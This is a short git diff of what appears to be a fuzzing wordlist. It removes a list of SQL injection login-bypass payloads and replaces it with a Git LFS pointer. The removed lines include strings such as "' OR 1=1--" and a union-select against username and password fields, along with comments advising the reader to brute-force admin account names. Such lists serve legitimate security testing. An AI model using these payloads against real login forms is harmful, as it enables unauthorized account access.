@@ -1,8 +1,3 @@
-# regex replace as many as you can with your fuzzer for best results:
-# <user-fieldname> <pass-fieldname> <username>
-# also try to brute force a list of possible usernames, including possile admin acct names
-<username>' OR 1=1--
-'OR '' = '	Allows authentication without a valid username.
-<username>'--
-' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
-'OR 1=1--
+version https://git-lfs.github.com/spec/v1
+oid sha256:d8c4b6064db3b477226cef44acf3ad325bb3ae7f372c21512bb73f66f2680308
+size 373
